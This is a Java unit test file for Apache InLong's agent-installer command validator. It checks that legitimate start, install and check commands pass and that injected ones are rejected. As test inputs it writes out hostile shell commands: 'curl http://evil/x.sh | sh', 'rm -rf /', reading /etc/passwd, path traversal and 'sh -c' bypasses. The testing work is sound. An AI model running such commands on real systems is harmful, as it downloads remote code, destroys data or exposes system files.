/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements. See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package installer;

import org.apache.inlong.agent.installer.validator.AllowedRootsResolver;
import org.apache.inlong.agent.installer.validator.ModuleCommandValidator;
import org.apache.inlong.agent.installer.validator.ModuleCommandValidator.ParsedSubCmd;
import org.apache.inlong.agent.installer.validator.ModuleCommandValidator.ValidationResult;

import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;

import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;

/**
 * Unit tests for {@link ModuleCommandValidator}, covering the core legal / illegal cases
 * against the command shapes issued by Manager, plus edge cases such as path traversal,
 * {@code sh -c} bypass and configurable extra allowed roots.
 */
public class ModuleCommandValidatorTest {

    private ModuleCommandValidator validator;
    private AllowedRootsResolver defaultRoots;

    @Before
    public void setUp() {
        // Roots that match the commands issued by Manager.
        String userHome = System.getProperty("user.home");
        Path inlongRoot = Paths.get(userHome, "inlong");
        Path tmpRoot = Paths.get(System.getProperty("java.io.tmpdir"));
        defaultRoots = AllowedRootsResolver.ofPaths(inlongRoot, tmpRoot);
        validator = new ModuleCommandValidator(defaultRoots);
    }

    @Test
    public void legal_startCommand_shouldPassAndBindWorkDir() {
        ValidationResult r = validator.validate("cd ~/inlong/inlong-agent/bin;sh agent.sh start");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(1, parsed.size());
        ParsedSubCmd sh = parsed.get(0);
        Assert.assertArrayEquals(new String[]{"sh", "agent.sh", "start"}, sh.getArgv());
        Assert.assertNotNull("cd should bind workDir", sh.getWorkDir());
        Assert.assertTrue(sh.getWorkDir().toString().endsWith("inlong/inlong-agent/bin"));
    }

    @Test
    public void legal_checkCommand_pipelineShouldSplit() {
        ValidationResult r = validator.validate(
                "ps aux | grep core.AgentMain | grep java | grep -v grep | awk '{print $2}'");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        Assert.assertEquals(1, parsed.size());
        ParsedSubCmd sub = parsed.get(0);
        Assert.assertTrue(sub.isPiped());
        List<String[]> pipeline = sub.getPipeline();
        Assert.assertEquals(5, pipeline.size());
        Assert.assertArrayEquals(new String[]{"ps", "aux"}, pipeline.get(0));
        Assert.assertArrayEquals(new String[]{"grep", "core.AgentMain"}, pipeline.get(1));
        Assert.assertArrayEquals(new String[]{"awk", "{print $2}"}, pipeline.get(4));
    }

    @Test
    public void legal_installCommand_multiSubShouldPass() {
        String cmd = "cd ~/inlong/inlong-agent/bin;sh agent.sh stop"
                + ";rm -rf ~/inlong/inlong-agent-temp"
                + ";mkdir -p ~/inlong/inlong-agent-temp"
                + ";cp -r ~/inlong/inlong-agent/.localdb ~/inlong/inlong-agent-temp";
        ValidationResult r = validator.validate(cmd);
        Assert.assertTrue("expected ok, got " + r, r.isOk());
        List<ParsedSubCmd> parsed = r.getParsed();
        // 'cd' has been absorbed as workDir, leaving four sub-commands: sh / rm / mkdir / cp.
        Assert.assertEquals(4, parsed.size());
        Assert.assertEquals("sh", parsed.get(0).getArgv()[0]);
        Assert.assertEquals("rm", parsed.get(1).getArgv()[0]);
        Assert.assertEquals("mkdir", parsed.get(2).getArgv()[0]);
        Assert.assertEquals("cp", parsed.get(3).getArgv()[0]);
        Assert.assertNotNull(parsed.get(0).getWorkDir());
    }

    @Test
    public void illegal_curlPipe_shouldRejectByMetaChar() {
        // "&&" hits the metacharacter blacklist.
        ValidationResult r = validator.validate(
                "cd ~/inlong/inlong-agent/bin;sh agent.sh start && curl http://evil/x.sh | sh");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void illegal_rmSlash_shouldRejectByPath() {
        ValidationResult r = validator.validate("sh agent.sh start; rm -rf /");
        assertRejected(r, ModuleCommandValidator.RULE_PATH_NOT_UNDER_ALLOWED_ROOT);
        Assert.assertTrue(r.getFailedSubCmd().contains("rm"));
    }

    @Test
    public void illegal_dollarParen_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo $(cat /etc/passwd)");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void illegal_wget_shouldRejectByWhitelist() {
        ValidationResult r = validator.validate("sh agent.sh start; wget http://evil");
        assertRejected(r, ModuleCommandValidator.RULE_NOT_IN_WHITELIST);
    }

    @Test
    public void illegal_pathTraversal_shouldRejectByPath() {
        // "~/inlong/../../../etc" expands to $HOME/inlong/../../../etc and normalizes to
        // /etc, which is outside every allowed root.
        ValidationResult r = validator.validate("rm -rf ~/inlong/../../../etc");
        assertRejected(r, ModuleCommandValidator.RULE_PATH_NOT_UNDER_ALLOWED_ROOT);
    }

    @Test
    public void illegal_shDashC_shouldRejectByForbiddenFlag() {
        // Use a payload without $( or && so that the metacharacter check does not fire before
        // the -c check.
        ValidationResult r = validator.validate("sh -c echo hello");
        assertRejected(r, ModuleCommandValidator.RULE_FORBIDDEN_SH_C_FLAG);
    }

    @Test
    public void bashDashC_shouldAlsoBeRejected() {
        ValidationResult r = validator.validate("bash -c echo hello");
        assertRejected(r, ModuleCommandValidator.RULE_FORBIDDEN_SH_C_FLAG);
    }

    @Test
    public void extraAllowedRoots_shouldPermitCustomRoot() {
        // Without /opt/inlong in the roots, "rm -rf /opt/inlong/tmp" must be rejected.
        ValidationResult r1 = validator.validate("rm -rf /opt/inlong/tmp");
        assertRejected(r1, ModuleCommandValidator.RULE_PATH_NOT_UNDER_ALLOWED_ROOT);

        // After adding /opt/inlong to the roots, the same command must be accepted.
        AllowedRootsResolver extended = AllowedRootsResolver.ofPaths(
                Paths.get(System.getProperty("user.home"), "inlong"),
                Paths.get(System.getProperty("java.io.tmpdir")),
                Paths.get("/opt/inlong"));
        ModuleCommandValidator extendedValidator = new ModuleCommandValidator(extended);
        ValidationResult r2 = extendedValidator.validate("rm -rf /opt/inlong/tmp");
        Assert.assertTrue("expected ok after adding /opt/inlong, got " + r2, r2.isOk());
    }

    @Test
    public void chmodNumericMode_shouldNotBeTreatedAsPath() {
        // "755" contains no slash and is not treated as a path; the ~/inlong/... argument is
        // a path and lives under an allowed root, so the whole command must pass.
        ValidationResult r = validator.validate("chmod 755 ~/inlong/inlong-agent/bin/agent.sh");
        Assert.assertTrue("expected ok, got " + r, r.isOk());
    }

    @Test
    public void emptyCommand_shouldReject() {
        assertRejected(validator.validate(""), ModuleCommandValidator.RULE_EMPTY_COMMAND);
        assertRejected(validator.validate("   "), ModuleCommandValidator.RULE_EMPTY_COMMAND);
    }

    @Test
    public void backtick_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo `id`");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void dollarBrace_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo ${HOME}");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void doublePipe_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("sh agent.sh stop || rm -rf /");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void backslash_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo hello\\ world");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void nullByte_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo foo\u0000bar");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void redirect_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("cat ~/inlong/a > ~/inlong/b");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void newline_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("sh agent.sh start\nrm -rf /");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    // Sample 6: here-string "<<<". "<" is on the metacharacter blacklist.
    @Test
    public void hereString_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("grep foo <<< payload");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    // Sample 7: process substitution "<(...)". "<" is on the metacharacter blacklist.
    @Test
    public void processSubstitution_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("grep foo <(cat ~/inlong/x)");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    // Sample 5: variable-assignment prefix such as "PATH=/tmp/evil ls". The token
    // "PATH=/tmp/evil" is not a whitelisted argv[0].
    @Test
    public void varAssignPrefix_shouldRejectByWhitelist() {
        ValidationResult r = validator.validate("PATH=/tmp/evil ls");
        assertRejected(r, ModuleCommandValidator.RULE_NOT_IN_WHITELIST);
    }

    // Sample: append redirection ">>" hits the metacharacter blacklist.
    @Test
    public void appendRedirect_shouldRejectByMetaChar() {
        ValidationResult r = validator.validate("echo hi >> ~/inlong/log");
        assertRejected(r, ModuleCommandValidator.RULE_DISALLOWED_META_CHAR);
    }

    @Test
    public void expandTilde_shouldReplaceHomePrefixOnly() {
        String home = System.getProperty("user.home");
        Assert.assertEquals(home, ModuleCommandValidator.expandTilde("~"));
        Assert.assertEquals(home + "/foo", ModuleCommandValidator.expandTilde("~/foo"));
        Assert.assertEquals("/abs/path", ModuleCommandValidator.expandTilde("/abs/path"));
        // Do not replace non-prefix tildes.
        Assert.assertEquals("a~b", ModuleCommandValidator.expandTilde("a~b"));
    }

    private void assertRejected(ValidationResult r, String expectedRule) {
        Assert.assertFalse("expected rejected, got " + r, r.isOk());
        Assert.assertEquals("rule name mismatch, msg=" + r.getMessage(),
                expectedRule, r.getRuleName());
    }
}
